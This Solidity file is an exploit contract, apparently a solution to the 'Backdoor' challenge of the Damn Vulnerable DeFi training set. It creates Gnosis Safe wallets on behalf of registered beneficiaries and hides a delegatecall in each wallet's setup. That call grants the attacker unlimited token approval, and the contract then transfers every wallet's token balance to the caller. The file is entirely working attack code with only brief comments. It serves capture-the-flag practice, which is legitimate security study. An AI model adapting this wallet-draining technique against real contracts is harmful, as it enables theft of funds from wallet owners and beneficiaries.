// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "hardhat/console.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttacker {
    function attack(
        address walletFactory,
        address singleton,
        IProxyCreationCallback walletRegistry,
        address _dvt,
        address[] memory beneficiaries
    ) external {
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(walletFactory);

        for (uint256 i = 0; i < beneficiaries.length; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            // In the "to" call we can approve our exploiter contract
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    owners, // owners
                    1, // _threshold
                    address(this), // to
                    abi.encodeWithSelector(this.receiveSetupCall.selector, address(this), _dvt), // data
                    address(0), // fallbackHandler
                    address(0), // paymentToken
                    0, // payment
                    payable(address(0)) // paymentReceiver
                ),
                0,
                walletRegistry
            );

            require(
                dvt.transferFrom(address(proxy), msg.sender, dvt.balanceOf(address(proxy))),
                "transferFrom failed"
            );
        }
    }

    // The proxy delegate calls to us. We can transfer tokens to the attacker
    function receiveSetupCall(address attackContract, address _dvt) external {
        DamnValuableToken dvt = DamnValuableToken(_dvt);
        dvt.approve(attackContract, type(uint256).max);
    }
}